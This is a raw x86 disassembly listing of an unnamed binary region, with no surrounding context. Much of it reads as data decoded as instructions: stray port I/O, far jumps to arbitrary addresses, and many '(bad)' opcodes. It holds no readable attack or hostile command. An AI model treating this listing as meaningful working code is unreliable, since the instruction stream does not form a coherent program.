  403842:	sbb    DWORD PTR [ecx+0x1a1701],ecx
  403848:	add    BYTE PTR [eax],al
  40384a:	add    BYTE PTR [eax],al
  40384c:	jp     0x40384f
  40384e:	pop    ss
  40384f:	sbb    bh,BYTE PTR [edx+0x11]
  403852:	pop    ss
  403853:	sbb    ch,BYTE PTR [edx-0x55e5e8ef]
  403859:	loope  0x403871
  40385b:	sbb    bl,BYTE PTR [edx-0x65e5e91f]
  403861:	mov    dl,0xd
  403863:	sbb    cl,BYTE PTR [edx-0x75e5f258]
  403869:	test   al,0xfc
  40386b:	sbb    bh,BYTE PTR [ebx-0x57]
  40386e:	cld    
  40386f:	sbb    bh,BYTE PTR [ebx-0x57]
  403872:	in     al,dx
  403873:	sbb    ch,BYTE PTR [ebx-0x54e51357]
  403879:	test   eax,0xa99b1adc
  40387e:	fcomp  QWORD PTR [edx]
  403880:	fwait
  403881:	test   eax,0xa98b1b0c
  403886:	or     al,0x1b
  403888:	mov    ebp,DWORD PTR [ecx-0x5183e005]
  40388e:	jecxz  0x4038af
  403890:	je     0x403840
  403892:	jmp    0x4038b3
  403894:	lods   al,BYTE PTR ds:[esi]
  403895:	scas   al,BYTE PTR es:[edi]
  403896:	rcr    DWORD PTR [edi],cl
  403898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403899:	scas   al,BYTE PTR es:[edi]
  40389a:	fistp  DWORD PTR [edi]
  40389c:	pushf  
  40389d:	scas   al,BYTE PTR es:[edi]
  40389e:	ret    
  40389f:	pop    ds
  4038a0:	xchg   esp,eax
  4038a1:	scas   al,BYTE PTR es:[edi]
  4038a2:	or     esp,DWORD PTR [eax]
  4038a4:	mov    WORD PTR [esi-0x517be00d],gs
  4038aa:	sti    
  4038ab:	pop    ds
  4038ac:	jl     0x40385c
  4038ae:	jecxz  0x4038cf
  4038b0:	add    BYTE PTR [eax],al
  4038b2:	add    BYTE PTR [eax],al
  4038b4:	add    BYTE PTR [esi+ebp*4-0x15],dh
  4038b8:	pop    ds
  4038b9:	lods   al,BYTE PTR ds:[esi]
  4038ba:	scas   al,BYTE PTR es:[edi]
  4038bb:	rcr    DWORD PTR [edi],cl
  4038bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038be:	scas   al,BYTE PTR es:[edi]
  4038bf:	fistp  DWORD PTR [edi]
  4038c1:	pushf  
  4038c2:	scas   al,BYTE PTR es:[edi]
  4038c3:	ret    
  4038c4:	pop    ds
  4038c5:	xchg   esp,eax
  4038c6:	scas   al,BYTE PTR es:[edi]
  4038c7:	or     esp,DWORD PTR [eax]
  4038c9:	mov    WORD PTR [esi-0x517be00d],gs
  4038cf:	cli    
  4038d0:	and    BYTE PTR [ebp-0x53],bh
  4038d3:	loop   0x4038f5
  4038d5:	jne    0x403884
  4038d7:	jmp    0xa520:0xd2adad20
  4038de:	lods   eax,DWORD PTR ds:[esi]
  4038df:	push   cs
  4038e0:	aam    0x70
  4038e2:	lods   eax,DWORD PTR ds:[esi]
  4038e3:	adc    ecx,esp
  4038e5:	jo     0x403894
  4038e7:	adc    eax,DWORD PTR [ecx+esi*2]
  4038ea:	lods   eax,DWORD PTR ds:[esi]
  4038eb:	adc    edi,esp
  4038ed:	jo     0x40389c
  4038ef:	adc    esi,esp
  4038f1:	jo     0x4038a0
  4038f3:	adc    ebp,esp
  4038f5:	jo     0x4038a4
  4038f7:	adc    esp,esp
  4038f9:	mov    al,0xad
  4038fb:	adc    ebx,esp
  4038fd:	mov    al,0xad
  4038ff:	adc    edx,esp
  403901:	mov    al,0xad
  403903:	adc    ecx,esp
  403905:	mov    al,0xad
  403907:	adc    eax,DWORD PTR [edi+ecx*4]
  40390a:	lods   eax,DWORD PTR ds:[esi]
  40390b:	adc    edi,esp
  40390d:	xchg   BYTE PTR [ebp-0x4f6d16ed],ch
  403913:	or     eax,0x9b48ee5
  403918:	icebp  
  403919:	add    BYTE PTR [eax],al
  40391b:	add    BYTE PTR [eax],al
  40391d:	add    BYTE PTR [ebx-0x660cf847],bl
  403923:	mov    bh,0x5
  403925:	in     eax,0x8f
  403927:	mov    esi,0xbd86dc02
  40392c:	add    esi,edi
  40392e:	popf   
  40392f:	mov    esp,0xbb94ee00
  403934:	add    ecx,edi
  403936:	and    DWORD PTR [edx-0x5d7c06e2],0x1e
  40393d:	fsub   DWORD PTR [edx-0x5d27e05f]
  403943:	mov    eax,ds:0xa0a1db1f
  403948:	sbb    al,0xdb
  40394a:	mov    eax,ds:0x80fa1ca0
  40394f:	lahf   
  403950:	sbb    eax,0x1d9f80fa
  403955:	std    
  403956:	xchg   DWORD PTR [esi-0x59800ae6],esp
  40395c:	sbb    al,BYTE PTR [eax]
  40395e:	ins    DWORD PTR es:[edi],dx
  40395f:	mov    ds:0xa35d141a,eax
  403964:	sbb    dl,BYTE PTR [esp+ebx*2]
  403967:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403968:	sbb    edx,DWORD PTR ds:0x151ba45c
  40396e:	sub    al,0xa4
  403970:	sbb    edx,DWORD PTR ds:0x151ba41c
  403976:	pop    ds
  403977:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403978:	sbb    BYTE PTR [esi],dl
  40397a:	pop    ds
  40397b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40397c:	sbb    BYTE PTR [esi],dl
  40397e:	out    dx,eax
  40397f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403980:	sbb    BYTE PTR [esi],dl
  403982:	add    BYTE PTR [eax],al
  403984:	add    BYTE PTR [eax],al
  403986:	add    bh,bl
  403988:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403989:	sbb    BYTE PTR [esi],dl
  40398b:	fisub  WORD PTR [ebp-0x5a21e8e7]
  403991:	sbb    DWORD PTR [edi],edx
  403993:	out    dx,al
  403994:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403995:	sbb    DWORD PTR [edi],edx
  403997:	fisub  WORD PTR [ebp-0x591ee8e7]
  40399d:	push   ss
  40399e:	sbb    cl,ah
  4039a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039a1:	push   ss
  4039a2:	sbb    BYTE PTR [ecx-0x4ee7e95a],dh
  4039a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039a9:	push   ss
  4039aa:	sbb    cl,ah
  4039ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039ad:	push   ss
  4039ae:	sbb    cl,ah
  4039b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039b1:	push   ss
  4039b2:	sbb    BYTE PTR [ecx-0x6ee7e952],dl
  4039b8:	scas   al,BYTE PTR es:[edi]
  4039b9:	push   ss
  4039ba:	sbb    BYTE PTR [eax-0x5fe6e859],ah
  4039c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039c1:	pop    ss
  4039c2:	sbb    DWORD PTR [eax-0x53],esi
  4039c5:	pop    ss
  4039c6:	sbb    DWORD PTR [eax-0x53],esi
  4039c9:	pop    ss
  4039ca:	sbb    DWORD PTR [eax-0x53],esp
  4039cd:	pop    ss
  4039ce:	sbb    DWORD PTR [eax-0x53],esp
  4039d1:	pop    ss
  4039d2:	sbb    DWORD PTR [eax-0x6fe6e853],edx
  4039d8:	lods   eax,DWORD PTR ds:[esi]
  4039d9:	pop    ss
  4039da:	sbb    DWORD PTR [eax+0x7a1a1705],edx
  4039e0:	add    eax,0x15aa1a17
  4039e5:	pop    ss
  4039e6:	sbb    ch,BYTE PTR [edx+0x1a1715]
  4039ec:	add    BYTE PTR [eax],al
  4039ee:	add    BYTE PTR [eax],al
  4039f0:	call   0x16e5:0x9a1a16e5
  4039f7:	sbb    cl,BYTE PTR [edx-0x75e5eb4b]
  4039fd:	mov    ch,0x14
  4039ff:	sbb    bh,BYTE PTR [edx+0x4]
  403a02:	push   ss
  403a03:	sbb    edi,DWORD PTR [ebx+0x4]
  403a06:	push   ss
  403a07:	sbb    ebp,DWORD PTR [ebx-0x54e4e9ec]
  403a0d:	adc    al,0x16
  403a0f:	sbb    ebx,DWORD PTR [ebx-0x64e4ea1c]
  403a15:	in     al,0x15
  403a17:	sbb    ecx,DWORD PTR [ebx-0x74e4ee4c]
  403a1d:	mov    ah,0x11
  403a1f:	sbb    edi,DWORD PTR [ebx+ebx*1+0xd]
  403a23:	add    BYTE PTR [eax-0x6ffff2e6],dl
  403a29:	sbb    eax,0x1c90000d
  403a2e:	or     eax,0xd179000
  403a33:	add    BYTE PTR [eax-0x6ffff2f2],dl
  403a39:	sbb    DWORD PTR ds:0xd109000,ecx
  403a3f:	add    BYTE PTR [eax-0x6ffff2ed],dl
  403a45:	adc    eax,0xff90000d
  403a4a:	or     al,0x0
  403a4c:	nop
  403a4d:	sbb    DWORD PTR ds:0xceb9000,ecx
  403a53:	add    BYTE PTR [eax],al
  403a55:	add    BYTE PTR [eax],al
  403a57:	add    BYTE PTR [eax],al
  403a59:	nop
  403a5a:	fisttp WORD PTR [eax+eax*1]
  403a5d:	nop
  403a5e:	mov    dl,0xf
  403a60:	add    al,0x90
  403a62:	mov    dl,0xf3
  403a64:	add    edx,DWORD PTR [eax-0x6ffbf84e]
  403a6a:	mov    dl,0xf
  403a6c:	add    al,0x90
  403a6e:	mov    dl,0xf7
  403a70:	add    edx,DWORD PTR [eax-0x6ffbf04e]
  403a76:	mov    dl,0xa7
  403a78:	add    edx,DWORD PTR [eax-0x6ffc684e]
  403a7e:	mov    dl,0x87
  403a80:	add    edx,DWORD PTR [eax-0x6ffc684e]
  403a86:	mov    dl,0x67
  403a88:	add    al,0x90
  403a8a:	mov    dl,0x47
  403a8c:	add    al,0x90
  403a8e:	mov    dl,0x27
  403a90:	add    al,0x90
  403a92:	mov    dl,0x7
  403a94:	add    al,0x90
  403a96:	mov    dl,0xe7
  403a98:	add    edx,DWORD PTR [eax-0x6ffc184e]
  403a9e:	mov    dl,0xe7
  403aa0:	add    edx,DWORD PTR [eax-0x6ffc194e]
  403aa6:	mov    dl,0xe5
  403aa8:	add    edx,DWORD PTR [eax-0x6ffc1b4e]
  403aae:	mov    dl,0xe3
  403ab0:	add    edx,DWORD PTR [eax-0x6ffc164e]
  403ab6:	mov    dl,0xef
  403ab8:	add    edx,DWORD PTR [eax+0x3d3b2]
  403abe:	add    BYTE PTR [eax],al
  403ac0:	add    BYTE PTR [eax],al
  403ac2:	nop
  403ac3:	mov    dl,0xf7
  403ac5:	add    edx,DWORD PTR [eax-0x6ffbf04e]
  403acb:	mov    dl,0xc7
  403acd:	add    edx,DWORD PTR [eax-0x6ffc284e]
  403ad3:	mov    dl,0x27
  403ad5:	add    al,0x90
  403ad7:	mov    dl,0x7
  403ad9:	add    al,0x90
  403adb:	mov    dl,0xe
  403add:	imul   edx,DWORD PTR [ebx-0x6c56f14e],0x8ce90eb2
  403ae7:	mov    dl,0xe
  403ae9:	imul   edx,DWORD PTR [edx+esi*4-0x4d7216f2],0xb296e90e
  403af4:	push   cs
  403af5:	jmp    0xea314341
  403afa:	xchg   ecx,eax
  403afb:	mov    dl,0xe
  403afd:	jmp    0xe94eed8d
  403b02:	xchg   edi,eax
  403b03:	mov    dl,0xe
  403b05:	jmp    0xe94eed8d
  403b0a:	jnp    0x403abe
  403b0c:	push   cs
  403b0d:	jmp    0xea314345
  403b12:	add    ecx,DWORD PTR [eax]
  403b14:	icebp  
  403b15:	jmp    0xe94eed6d
  403b1a:	mov    bl,0xb2
  403b1c:	push   cs
  403b1d:	jmp    0x574eedb5
  403b22:	jecxz  0x403ad4
  403b24:	jns    0x403b3b
  403b26:	add    BYTE PTR [eax],al
  403b28:	add    BYTE PTR [eax],al
  403b2a:	add    BYTE PTR [ebx+0x43a3e0b8],dh
  403b30:	mov    ecx,0x9617f097
  403b35:	or     DWORD PTR [esi+0x0],ebx
  403b38:	popf   
  403b39:	jle    0x403b37
  403b3b:	xchg   bx,ax
  403b3d:	out    0x8a,eax
  403b3f:	jg     0xec4c36d5
  403b45:	inc    DWORD PTR [esp+ebp*1-0x4f8891a]
  403b4c:	fucomp st(5)
  403b4e:	jno    0x403b0b
  403b50:	in     al,0x98
  403b52:	ret    0x404f
  403b55:	pop    es
  403b56:	dec    esp
  403b57:	enter  0x7041,0x0
  403b5b:	jbe    0x403b6d
  403b5d:	mov    ecx,0xb19fd8e7
  403b62:	nop
  403b63:	test   DWORD PTR [esi+0xeeb1db9],ebx
  403b69:	mov    eax,ds:0xb7c4216a
  403b6e:	repz lahf 
  403b70:	jae    0x403b22
  403b72:	test   BYTE PTR [edi+esi*8],bh
  403b75:	rcr    DWORD PTR [edx],cl
  403b77:	rcl    BYTE PTR [edx-0x2d],cl
  403b7a:	ins    DWORD PTR es:[edi],dx
  403b7b:	sub    BYTE PTR [eax-0x78890b26],bl
  403b81:	fld    QWORD PTR [ebx+0x13622b17]
  403b87:	jns    0x403b1f
  403b89:	gs fs repz dec ebx
  403b8d:	ins    BYTE PTR es:[edi],dx
  403b8e:	std    
  403b8f:	add    BYTE PTR [eax],al
  403b91:	add    BYTE PTR [eax],al
  403b93:	add    BYTE PTR [ebp-0x11759505],cl
  403b99:	pop    esi
  403b9a:	unpcklps xmm0,xmm0
  403b9d:	fimul  DWORD PTR [eax]
  403b9f:	arpl   WORD PTR [edx],bx
  403ba1:	add    BYTE PTR [eax],al
  403ba3:	cli    
  403ba4:	add    al,0xb0
  403ba6:	push   es
  403ba7:	lea    esi,[ecx+0x1f3b630e]
  403bad:	mov    ds:0x73d54c67,eax
  403bb2:	outs   dx,BYTE PTR ds:[esi]
  403bb3:	aad    0x3b
  403bb5:	ret    
  403bb6:	imul   esp,DWORD PTR [edx+0x3c0d2718],0x4b09e276
  403bc0:	int3   
  403bc1:	xchg   DWORD PTR [ebx],eax
  403bc3:	shl    BYTE PTR [edx-0x69],cl
  403bc6:	add    al,0xa5
  403bc8:	add    ebx,DWORD PTR [ebx+0x266d35bb]
  403bce:	mov    esp,0xb4fbe742
  403bd3:	fld    TBYTE PTR [ecx+0x4b]
  403bd6:	mov    dl,0xac
  403bd8:	nop
  403bd9:	cmp    al,0x29
  403bdb:	fadd   st,st(2)
  403bdd:	sahf   
  403bde:	push   esi
  403bdf:	(bad)  
  403be1:	cmp    al,0x8
  403be3:	(bad)  
  403be4:	pop    esp
  403be5:	sar    ecx,cl
  403be7:	shr    BYTE PTR [ebx],1
  403be9:	jo     0x403be8
  403beb:	fdiv   DWORD PTR [esi-0x3e21f2bf]
  403bf1:	fwait
  403bf2:	pop    esp
  403bf3:	xlat   BYTE PTR ds:[ebx]
  403bf4:	dec    eax
  403bf5:	(bad)  
  403bf6:	sub    edx,eax
  403bf8:	add    BYTE PTR [eax],al
  403bfa:	add    BYTE PTR [eax],al
  403bfc:	add    BYTE PTR [edi],dl
  403bfe:	daa    
  403bff:	mov    eax,ds:0xceb871b4
  403c04:	mov    bl,0xde
  403c06:	xchg   edx,eax
  403c07:	cmp    BYTE PTR [edx-0x42afeab1],0xf8
  403c0e:	pop    ebp
  403c0f:	jne    0x403c13
  403c11:	js     0x403c26
  403c13:	test   DWORD PTR ds:0xcd469c7,eax
  403c19:	push   esi
  403c1a:	lock mov ds:0x3994e10b,eax
  403c20:	outs   dx,DWORD PTR ds:[esi]
  403c21:	mov    edi,0x6868490a
  403c26:	pusha  
  403c27:	sbb    BYTE PTR [ecx-0x2f],ah
  403c2a:	inc    esi
  403c2b:	call   0x4cac7a95
  403c30:	fsub   QWORD PTR [esi+0xd]
  403c33:	cmp    al,0xdb
  403c35:	xchg   ecx,eax
  403c36:	dec    edi
  403c37:	jmp    0xe7d5:0x1aa1f8d1
  403c3e:	xchg   edx,eax
  403c3f:	(bad)  
  403c40:	mov    cl,0x41
  403c42:	adc    al,0x7e
  403c44:	mov    dh,0x8e
  403c46:	ss scas al,BYTE PTR es:[edi]
  403c48:	mov    edi,0xb8c1091f
  403c4d:	test   al,0x39
  403c4f:	ret    
  403c50:	pop    es
  403c51:	sub    bh,bh
  403c53:	mov    cl,0x0
  403c55:	xchg   edi,eax
  403c56:	mov    dl,0x79
  403c58:	ins    BYTE PTR es:[edi],dx
  403c59:	mov    DWORD PTR [edi+ecx*1],ebx
  403c5c:	pushf  
  403c5d:	xchg   BYTE PTR [ebx],dl
  403c5f:	pop    esp
  403c60:	or     DWORD PTR [eax],eax
  403c62:	add    BYTE PTR [eax],al
  403c64:	add    BYTE PTR [eax],al
  403c66:	cli    
  403c67:	test   DWORD PTR [edx+0x50baf4f8],esi
  403c6d:	sub    ah,dh
  403c6f:	and    esp,esi
  403c71:	push   edi
  403c72:	repz or al,0x73
  403c75:	push   ebp
  403c76:	sti    
  403c77:	cdq    
  403c78:	add    eax,0x4fa6f425
  403c7d:	hlt    
  403c7e:	hlt    
  403c7f:	das    
  403c80:	mov    eax,ds:0x4a00f203
  403c85:	xchg   ecx,eax
  403c86:	xchg   esi,eax
  403c87:	xchg   esi,eax
  403c88:	fsub   QWORD PTR [eax-0x6f]
  403c8b:	test   eax,0x3088b026
  403c90:	cwde   
  403c91:	mov    edi,0xdd20ff87
  403c96:	loopne 0x403c26
  403c98:	xchg   edi,eax
  403c99:	lods   al,BYTE PTR ds:[esi]
  403c9a:	fistp  WORD PTR [edi+0x38de7c1d]
  403ca0:	xchg   ebx,eax
  403ca1:	mov    ebx,ecx
  403ca3:	add    eax,0x8fed1938
  403ca8:	scas   al,BYTE PTR es:[edi]
  403ca9:	call   0x3834db97
  403cae:	jecxz  0x403ce5
  403cb0:	mov    al,BYTE PTR [edi-0x24]
  403cb3:	or     BYTE PTR [edi+0x11772224],bl
  403cb9:	push   ebp
  403cba:	sbb    eax,0x1c0453c8
  403cbf:	push   ecx
  403cc0:	(bad)
  403cc3:	fisub  WORD PTR ds:0xb877ef61
  403cc9:	nop
  403cca:	add    BYTE PTR [eax],al
  403ccc:	add    BYTE PTR [eax],al
  403cce:	add    al,ch
  403cd0:	(bad)  
  403cd1:	pop    edx
  403cd2:	shl    cl,0x4d
  403cd5:	int3   
  403cd6:	scas   eax,DWORD PTR es:[edi]
  403cd7:	fsubrp st(0),st
  403cd9:	or     eax,0x4d9afd43
  403cde:	lods   eax,DWORD PTR ds:[esi]
  403cdf:	les    edx,FWORD PTR [ebx-0x72f3d0c6]
  403ce5:	mov    ds:0xd4921bb9,eax
  403cea:	sbb    bh,BYTE PTR [ecx-0x50]
  403ced:	dec    edx
  403cee:	test   BYTE PTR [eax-0x37d9c251],ch
  403cf4:	mov    eax,0xb5bfb0a4
  403cf9:	shl    DWORD PTR [ebp+0x435eada4],cl
  403cff:	int3   
  403d00:	mov    al,0x29
  403d02:	stc    
  403d03:	xor    DWORD PTR [edi-0x478c9850],0xffffffc7
  403d0a:	or     al,0xc1
  403d0c:	call   0xf02e:0x94109a59
  403d13:	dec    edi
  403d14:	lea    esi,[edi-0x3f6de8a2]
  403d1a:	out    0xec,eax
  403d1c:	in     al,0x4f
  403d1e:	push   ecx
  403d1f:	push   esp
  403d20:	jmp    0x55bd:0xe2fbcb26
  403d27:	stos   DWORD PTR es:[edi],eax
  403d28:	fcmovne st,st(0)
  403d2a:	dec    BYTE PTR [eax]
  403d2c:	inc    ecx
  403d2d:	push   edi
  403d2e:	push   0xc2203e98
  403d33:	add    BYTE PTR [eax],al
  403d35:	add    BYTE PTR [eax],al
  403d37:	add    BYTE PTR [edi+0x45],ah
  403d3a:	mov    ecx,0xce48af4c
  403d3f:	leave  
  403d40:	adc    cl,BYTE PTR [ebx-0x1d]
  403d43:	aaa    
  403d44:	bound  eax,QWORD PTR [ebx-0x6c]
  403d47:	cmc    
  403d48:	xor    DWORD PTR ds:0x41c2830d,edi
  403d4e:	jp     0x403d60
  403d50:	(bad)  
  403d51:	fucom  st(3)
  403d53:	jle    0x403dca
  403d55:	loopne 0x403ce9
  403d57:	add    ah,bl
  403d59:	in     eax,0xd3
  403d5b:	add    al,0x2a
  403d5d:	mov    ah,0xd2
  403d5f:	jae    0x403d2c
  403d61:	mov    edx,0x92de36d
  403d66:	ins    DWORD PTR es:[edi],dx
  403d67:	xchg   esp,eax
  403d68:	mov    bh,0xd9
  403d6a:	arpl   WORD PTR ds:0x7a646841,cx
  403d70:	jb     0x403d60
  403d72:	jmp    ebx
  403d74:	hlt    
  403d75:	cmp    eax,0x8d4e9307
  403d7a:	push   cs
  403d7b:	or     bh,BYTE PTR [eax-0x4282f6e4]
  403d81:	and    DWORD PTR [ecx],eax
  403d83:	lock or edx,DWORD PTR [ecx+0x41418706]
  403d8a:	nop    DWORD PTR [edi+0x46907f0]
  403d91:	jbe    0x403dff
  403d93:	div    DWORD PTR [edx-0x5b]
  403d96:	imul   eax,DWORD PTR [eax+0x196514f8],0x0
  403d9d:	add    BYTE PTR [eax],al
  403d9f:	add    BYTE PTR [eax],al
  403da1:	into   
  403da2:	add    al,0x64
  403da4:	outs   dx,BYTE PTR ds:[esi]
  403da5:	out    dx,eax
  403da6:	test   eax,0x19d9feda
  403dab:	fmul   QWORD PTR [ecx+0x10d4c953]
  403db1:	gs js  0x403d87
  403db4:	addr16 push ss
  403db6:	fidiv  WORD PTR [esi-0x4fb25f07]
  403dbc:	mov    gs,WORD PTR [edx]
  403dbe:	jge    0x403d79
  403dc0:	pop    ss
  403dc1:	pushf  
  403dc2:	sub    al,0xbe
  403dc4:	pusha  
  403dc5:	xchg   ecx,eax
  403dc6:	xchg   ecx,eax
  403dc7:	fcom   st(6)
  403dc9:	ja     0x403ded
  403dcb:	fbld   TBYTE PTR [ecx+0x38d5f12d]
  403dd1:	fwait
  403dd2:	inc    eax
  403dd3:	ror    DWORD PTR [edi-0x70],1
  403dd6:	jmp    0xbc43:0x6be1bb11
  403ddd:	test   BYTE PTR [ebp-0xd],0xb4
  403de1:	ja     0x403da3
  403de3:	loopne 0x403d96
  403de5:	pop    eax
  403de6:	pop    ds
  403de7:	out    0xc,al
  403de9:	enter  0x17a4,0xa
  403ded:	out    dx,eax
  403dee:	and    al,BYTE PTR [edi+0x3]
  403df1:	pop    esi
  403df2:	mov    ecx,0x4cd10434
  403df7:	stos   BYTE PTR es:[edi],al
  403df8:	pusha  
  403df9:	addr16 (bad) 
  403dfb:	(bad)  [edi+0x28]
  403dfe:	sub    DWORD PTR [ebx+0x78b2c16e],ecx
  403e04:	imul   eax,DWORD PTR [eax],0x0
  403e0a:	(bad)  
  403e0b:	xchg   edi,eax
  403e0c:	jle    0x403e6f
  403e0e:	pop    ebx
  403e0f:	out    0x8d,al
  403e11:	data16 sbb al,0x2c
  403e14:	fild   QWORD PTR [edi-0x53]
  403e17:	test   eax,0x7ee268ac
  403e1c:	and    cl,BYTE PTR [esp+edx*2]
  403e1f:	or     eax,0x32fb0b32
  403e24:	add    eax,DWORD PTR [edx]
  403e26:	jb     0x403dd8
  403e28:	rol    BYTE PTR [eax*8+0x4db9f689],1
  403e2f:	mov    ah,0x7
  403e31:	mov    ebp,0xb4577de2
  403e36:	imul   edx,DWORD PTR [edi],0x27
  403e39:	mov    bl,0x6c
  403e3b:	jo     0x403df7
  403e3d:	xlat   BYTE PTR ds:[ebx]
  403e3e:	rcr    dl,cl
  403e40:	leave  
  403e41:	rol    BYTE PTR [ebp-0x7b],1
  403e44:	fldenv [esi+ebx*8-0x44b42196]
  403e4c:	iret   
  403e4d:	fs or  edi,edx
  403e50:	mov    esi,0x8bb2ec63
  403e55:	addr16 push 0xffffff87
  403e58:	std    
  403e59:	xchg   esi,eax
  403e5a:	cmp    eax,0x990a8eb4
  403e5f:	push   ds
  403e60:	add    dl,bh
  403e62:	lea    ecx,ds:0x848f2b62
  403e68:	aam    0x5a
  403e6a:	nop
  403e6b:	mov    bh,0x65
  403e6d:	add    BYTE PTR ds:[eax],al
  403e70:	add    BYTE PTR [eax],al
  403e72:	add    bh,ah
  403e74:	daa    
  403e75:	fld    TBYTE PTR ds:0xdf5914d8
  403e7b:	loopne 0x403efa
  403e7d:	out    dx,eax
  403e7e:	push   cs
  403e7f:	inc    esi
  403e80:	scas   al,BYTE PTR es:[edi]
  403e81:	jl     0x403e05
  403e83:	bound  esp,QWORD PTR [edx+edx*8]
  403e86:	jno    0x403eed
  403e88:	pop    ss
  403e89:	xor    BYTE PTR [ebx-0x2d3981ac],ah
  403e8f:	dec    ebx
  403e90:	lods   eax,DWORD PTR ds:[esi]
  403e91:	xchg   ebx,eax
  403e92:	(bad)  
  403e93:	inc    ebx
  403e94:	cmp    BYTE PTR ds:0x6f0344a6,ah
  403e9a:	ja     0x403ed1
  403e9c:	mov    al,cl
  403e9e:	xchg   BYTE PTR [edx-0x5f],ch
  403ea1:	sub    bl,BYTE PTR [edx]
  403ea3:	push   es
  403ea4:	xor    edi,DWORD PTR [ecx+ebp*8+0x3b4607f8]
  403eab:	add    BYTE PTR [ecx-0x6618b548],dl
  403eb1:	inc    ecx
  403eb2:	dec    esi
  403eb3:	cwde   
  403eb4:	sub    dh,BYTE PTR [edi+0x3d018f1d]
  403eba:	out    dx,eax
  403ebb:	lea    ebx,[eax-0x5c6f014d]
  403ec1:	sbb    BYTE PTR [edx+0x618e316d],dl
  403ec7:	jb     0x403ec3
  403ec9:	adc    esi,DWORD PTR [ebx-0x3d556c95]
  403ecf:	jl     0x403e79
  403ed1:	push   cs
  403ed2:	jno    0x403f01
  403ed4:	lods   al,BYTE PTR ds:[esi]
  403ed5:	scas   al,BYTE PTR es:[edi]
  403ed6:	inc    DWORD PTR [eax]
  403ed8:	add    BYTE PTR [eax],al
  403eda:	add    BYTE PTR [eax],al
  403edc:	lds    ebp,FWORD PTR [esi-0x49f0c227]
  403ee2:	inc    eax
  403ee3:	stos   DWORD PTR es:[edi],eax
  403ee4:	inc    esi
  403ee5:	mov    ch,0x37
  403ee7:	dec    eax
  403ee8:	mov    edx,0x99d6a997
  403eed:	xchg   edx,eax
  403eee:	fidiv  WORD PTR [ebx+ecx*2]
  403ef1:	mov    eax,DWORD PTR [edi-0x5e]
  403ef4:	push   0xffffff90
  403ef6:	xor    BYTE PTR [ebx],ah
  403ef8:	xchg   bl,ah
  403efa:	lahf   
  403efb:	lea    ecx,[ebp-0x18]
  403efe:	(bad)  
  403eff:	seta   bh
  403f02:	dec    ebp
  403f03:	cdq    
  403f04:	jle    0x403eee
  403f06:	cmp    BYTE PTR [edx],bh
  403f08:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f0c:	and    DWORD PTR [eax+edx*8],edi
  403f0f:	push   es
  403f10:	push   ebx
  403f11:	inc    ebp
  403f12:	dec    ecx
  403f13:	nop
  403f14:	and    al,BYTE PTR [esi+0x3e]
  403f17:	aad    0x1d
  403f19:	ds mov bl,0x63
  403f1c:	push   ebp
  403f1d:	cmp    eax,0x43ff19c4
  403f22:	pop    ebp
  403f23:	xchg   DWORD PTR [esi+0x49ec2a46],esi
  403f29:	lock mov bl,0x7a
  403f2c:	mov    edi,esp
  403f2e:	ret    0xdb10
  403f31:	loopne 0x403f8c
  403f33:	jle    0x403faf
  403f35:	fldcw  WORD PTR [edi+eax*1]
  403f38:	jbe    0x403ed2
  403f3a:	mov    ebp,0xca915d71
  403f3f:	jmp    0x403f41
  403f41:	add    BYTE PTR [eax],al
  403f43:	add    BYTE PTR [eax],al
  403f45:	xchg   BYTE PTR [edx-0x6f118aad],cl
  403f4b:	and    al,0xde
  403f4d:	sub    DWORD PTR [ebx-0x50eeb746],0xe4f200cd
  403f57:	or     bl,BYTE PTR [edx+0x7c]
  403f5a:	push   esp
  403f5b:	or     al,0x2d
  403f5d:	stc    
  403f5e:	mov    bl,0xe
  403f60:	add    BYTE PTR [eax],ch
  403f62:	pop    es
  403f63:	adc    al,0x19
  403f65:	imul   ebx,eax,0x38
  403f68:	xor    bh,dl
  403f6a:	and    ebp,DWORD PTR gs:[ebx]
  403f6d:	mov    ch,0xf8
  403f6f:	popa   
  403f70:	fs je  0x403fad
  403f73:	jns    0x403ff2
  403f75:	daa    
  403f76:	mov    DWORD PTR [esi+edx*2-0xa],edx
  403f7a:	sbb    al,0x4f
  403f7c:	dec    edi
  403f7d:	mov    cl,0x7d
  403f7f:	xlat   BYTE PTR ds:[ebx]
  403f80:	enter  0x8d70,0xcc
  403f84:	shl    DWORD PTR [ebx],1
  403f86:	push   ds
  403f87:	loope  0x403f83
  403f89:	inc    edx
  403f8a:	jmp    0x403f85
  403f8c:	jecxz  0x403ffb
  403f8e:	jb     0x403f4b
  403f90:	lods   al,BYTE PTR ds:[esi]
  403f91:	pushf  
  403f92:	les    esp,FWORD PTR [eax-0x7420004b]
  403f98:	sahf   
  403f99:	mov    ds:0xa8888796,al
  403f9f:	int3   
  403fa0:	dec    edx
  403fa1:	cmp    DWORD PTR [esi],edx
  403fa3:	(bad)  
  403fa4:	push   ebx
  403fa5:	call   0x0:0x78fac6
  403fac:	add    BYTE PTR [eax],al
  403fae:	retf   
  403faf:	jae    0x403f92
  403fb1:	popa   
  403fb2:	add    al,0xda
  403fb4:	lahf   
  403fb5:	cs inc ebp
  403fb7:	dec    ecx
  403fb8:	mov    ebx,0x96879637
  403fbd:	sbb    al,0xc7
  403fbf:	sub    cl,BYTE PTR [ebp+0x152b0005]
  403fc5:	add    BYTE PTR [ecx+0x5c],0xe
  403fc9:	fwait
  403fca:	rcl    BYTE PTR [eax+0x23],cl
  403fcd:	mov    al,0x13
  403fcf:	cmp    eax,0x4690a938
  403fd4:	inc    eax
  403fd5:	ja     0x403fcd
  403fd7:	or     al,0x11
  403fd9:	ins    BYTE PTR es:[edi],dx
  403fda:	not    edi
